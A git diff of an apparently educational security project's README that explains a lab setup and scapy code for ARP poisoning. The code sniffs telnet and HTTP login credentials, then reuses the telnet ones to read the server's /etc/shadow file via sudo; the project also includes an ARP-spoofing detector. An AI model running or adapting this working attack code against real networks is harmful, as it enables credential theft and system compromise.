@@ -69,12 +69,31 @@ fast packet prototyping by using default values that work. We will use this to e
 #### Python code files
 
 - main.py: this file is the central hub to launch all the other scripts. You just need to specify an argument when launching this script between the available list (ARP, telnet, http, defense). For the `http` or `telnet` sniffing commands to work, you should launch the `ARP` command first in a separate window in order to become MITM.
+
 - src/mitm/mitm.py: this script is launched with the `ARP` command when executing main.py. The script launches the ARP Poisoning attack on the specified IP addresses (client & server) so that the attacker becomes MITM. When stopped, it sends the correct ARP responses packets back to the targets.
+
 - src/mitm/sniffer_telnet.py: this script is launched with the `telnet` command when executing main.py. The script analyses the content of the telnet connection packets that are transiting between the client and the server to fetch the credentials. Once the credentials are obtained, the script prints the login/password for the attacker and initialises a telnet connection to the server with those credentials. It then tries to read the content of the shadow file and paste its content in a .txt file called `output_date.txt`.
+
 - src/mitm/sniffer_http.py: this script is launched with the `http` command when executing main.py. The script analyses the content of the POST HTTP packets that are transiting between the client and the server when the client tries to log in on the web page. It fetchs the credentials and print them for the attacker.
+
 - src/mitm/anti_spoofing.py: this script is launched with the `defense` command when executing main.py. The script only works on a Windows environment for now but it will continuously check the content of the ARP table and detect if a MAC address corresponds to two different IPs. Once it detects an ARP Poisoning attempt, it will print an alert for the administrator.
+
 - src/mitm/utils.py: Python file not launchable via the main.py. It contains a function used in the majority of our scripts that sends an ARP request to a specified IP in order to get its MAC address.
-- src/webapp/: contains our test login page files (index.html, login.php and style.css) 
+
+- src/webapp/: contains our test login page files (index.html, login.php and style.css).
+
+#### How to test our project
+
+The first thing to do in order to test our project is to have 3 VMs installed on the same subnetwork: an attacker, a client and a server. You can dowload our client and server `.ova` files in the Appendix section or used your own VMs.
+You have to install telnet client on the client VM and telnet server on the server VM. You also have to install apache2 on the server VM. You can use our test login page files to run on the port 80 of your server VM.
+Finally, you have to git clone our project and simply run the script main.py with an argument.
+You also need to install the `scapy` library as specified in the `requirements.txt` file.
+
+Do not forget that you need to execute `python3 main.py ARP` in a separate window before using `python3 main.py telnet` or `python3 main.py http`.
+Once you executed `python3 main.py telnet`, you can start a telnet connection between you client and server to fetch the credentials.
+Same principle for `python3 main.py http`. You can then proceed to log in with any login/password pair that you want on the login page and the credentials will be fetched.
+
+For `anti_spoofing.py`, you need to be on a Windows environment because the regex used are different than on Linux.
 
 #### First case: Telnet connection attack
 
@@ -151,8 +170,23 @@ However, in our case, we have a script that does the sniffing and the credential
 First of all, we use the scapy library and its function `sniff` to analyse incoming packets on our network interface:
 
 ```python
-sniff(iface=target, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
-      count=0)
+def run():
+    global target2_ip
+    interface = "eth0"
+    
+    try:
+        target1_ip = raw_input("[*] Enter Client IP: ")
+        target2_ip = raw_input("[*] Enter Server IP: ")
+        
+    except KeyboardInterrupt:
+        print("\n[*] User Requested Shutdown")
+        print("[*] Exiting...")
+        sys.exit(1)
+    
+    print("Analysing packets...")
+    client_mac = get_mac(target1_ip)
+    sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
+          count=0)
 ```
 
 Here we specify that we only want to analyse incoming packets with a destination port of 23 and a source MAC address from our client machine.
@@ -161,8 +195,8 @@ Then, each new packet object will be executed as an argument of the `get_telnet_
 ```python
 def get_telnet_credentials(pkt):
     global counter
-    global login
-    global password
+    global user_login
+    global user_password
 
     try:
         pkt.getlayer(Raw).load
@@ -172,11 +206,11 @@ def get_telnet_credentials(pkt):
 
     payload = str(pkt.getlayer(Raw).load)
     if payload != "b'\\r\\x00'" and counter == 1:
-        login.append(payload[2])
+        user_login.append(payload[2])
         return
 
     elif payload != "b'\\r\\x00'" and counter == 2:
-        password.append(payload[2])
+        user_password.append(payload[2])
         return
 
     elif payload == "b'\\xff\\xfd\\x01'":
@@ -186,7 +220,8 @@ def get_telnet_credentials(pkt):
     elif payload == "b'\\r\\x00'":
         counter = counter + 1
         if counter == 3:
-            use_telnet_credentials(login, password)
+            print("Credentials found in Telnet packets")
+            use_telnet_credentials(user_login, user_password)
         else:
             return
     else:
@@ -209,38 +244,35 @@ def use_telnet_credentials(login, password):
     for j in password:
         str_password = str_password + j
 
-    print("user user_login: " + str_login + "| user user_password: " + str_password)
+    print("user login: " + str_login + "| user password: " + str_password)
 
     try:
-        tn = telnetlib.Telnet(target2_ip)
-        tn.read_until(b"user_login: ", 2)
+        print("Connecting to the host " + target2_ip + "...")
+        tn = telnetlib.Telnet(target2_ip, 23, 2)
+        tn.read_until(b"login: ", 2)
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
-        
-    except Exception as e:
-		print("an error occured: " + str(e))
-        print("telnet connection with remote server couldn't be established")
-        sys.exit(1)
-    
-    try:
         tn.write(b"sudo cat /etc/shadow\n")
+        # Following line would need to be changed depending of the language configuration of the server machine: actually set for a French VM
+        # Could be replaced by b"[sudo] password for " + str_login.encode('ascii') + b": " in English VM
         tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
         tn.write(b"exit\n")
         read_data = tn.read_all()
         with open('output_data.txt', 'w') as output:
             output.write(str(read_data))
-        print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
+        print("[*] Ending Telnet Session: check output_data.txt for shadow file content")
         sys.exit(1)
         
     except Exception as e:
-		print("an error occured: " + str(e))
-        print("account not in sudoers list: shadow file unaccessible")
+        print("an error occured: " + str(e))
         sys.exit(1)
 ```
 
-This function print the login and password sniffed and also, using the `telnetlib` libary, allows us to automatically connect to the server and steal the content of the shadow file.
+This function print the sniffed login and password and also, using the `telnetlib` libary, allows us to automatically connect to the server and steal the content of the shadow file.
+
+Here we can see the result of executing the telnet sniffing script (after executing the ARP poisoning script).
 
 ![Telnet Hacking](assets/telnet-leak.PNG)
 
@@ -257,7 +289,7 @@ Here you can see that we used the front page from facebook as a test login page:
 
 ##### ARP Poisoning
 
-We use the same functions, as explained previously, to launch an arp poisonning attack on the client and the web server in order to sniff the HTTP traffic.
+We use the same functions, as explained previously, to launch an ARP Poisonning attack on the client and the web server in order to sniff the HTTP traffic.
 
 ##### Packets Sniffing and Credentials Retrieving
 
@@ -269,21 +301,34 @@ Here again, it is possible to use Wireshark to analyse the HTTP traffic and get 
 In our code, we still use the `sniff` function to analyse incoming packets:
 
 ```python
-sniff(iface=interface, prn=get_http_credentials, filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0,
+def run():
+    interface = "eth0"
+    
+    try:
+        target1_ip = raw_input("[*] Enter Client IP: ")
+        target2_ip = raw_input("[*] Enter Server IP: ")
 
-count=0)
+    except KeyboardInterrupt:
+        print("\n[*] User Requested Shutdown")
+        print("[*] Exiting...")
+        sys.exit(1)
+    
+    print("Analysing packets...")
+    client_mac = get_mac(target1_ip)
+    sniff(iface=interface, prn=get_http_credentials,
+          filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0, count=0)
 ```
 
 Then every packet object is executed as an argument of the function `get_http_credentials`:
 
 ```python
 def get_http_credentials(pkt):
-    global login
-    global password
+    global user_login
+    global user_password
     global password_field
     global login_field
     full_str_credentials = ""
-    
+
     try:
         pkt.getlayer(Raw).load
 
@@ -293,29 +338,33 @@ def get_http_credentials(pkt):
     payload = str(pkt.getlayer(Raw).load)
     if "POST" in payload and "Upgrade-Insecure-Requests" in payload:
         try:
-            for i in range(get_index(payload, login_field), len(payload) - 1 ):
+            for i in range(get_index(payload, login_field), len(payload) - 1):
                 full_str_credentials = full_str_credentials + payload[i]
 
         except Exception as e:
-			print("an error occured: " + str(e))
-            print("credentials not found in POST request")
+            print("Credentials not found in POST request")
             return
+        
+        print("Credentials found in POST request")
+        for j in range(get_index(full_str_credentials, login_field) + len(login_field),
+                       full_str_credentials.index("&")):
+            user_login = user_login + full_str_credentials[j]
 
-        for j in range(get_index(full_str_credentials, login_field) + len(login_field), full_str_credentials.index("&")):
-            login = login + full_str_credentials[j]
+        for k in range(get_index(full_str_credentials, password_field) + len(password_field),
+                       len(full_str_credentials)):
+            user_password = user_password + full_str_credentials[k]
 
-        for k in range(get_index(full_str_credentials, password_field)+ len(password_field), len(full_str_credentials)):
-            password = password + full_str_credentials[k]
-
-        print("user user_login: " + login + " | user user_password: " + password)
+        print("user login: " + user_login + " | user password: " + user_password)
         sys.exit(1)
 
     else:
         return
 ```
 
-This function allows us to parse the content of the POST HTTP request in order to get the login and the password.
+This function allows us to parse the content of the POST HTTP request payload in order to get the login and the password.
 The function `get_index` returns the index of a character in a string.
+
+Here we can see the result of executing the http sniffing script (after executing the ARP poisoning script).
 
 ![HTTP Hacking](assets/http-leak.PNG)
 
@@ -430,6 +479,8 @@ be tricked by other attacks like social engineering, phishing attacks, etc. And 
 2. [ARP poisoning/spoofing: How to detect & prevent it](https://www.comparitech.com/blog/vpn-privacy/arp-poisoning-spoofing-detect-prevent/)
 
 ### Appendix
+
+Contributions: BLABLA
 
 1. [Client Virtual Machine [ login:client | password:client ]](https://drive.google.com/open?id=1jqys0pS7WHDOQ2o-dHbC_ZloOjKGRBb-)
 2. [Server Virtual Machine [ login:server | password : server ]](https://drive.google.com/open?id=1yCcbmsN0bCVQOsF0VYAkSZGiv8p4rXXd)
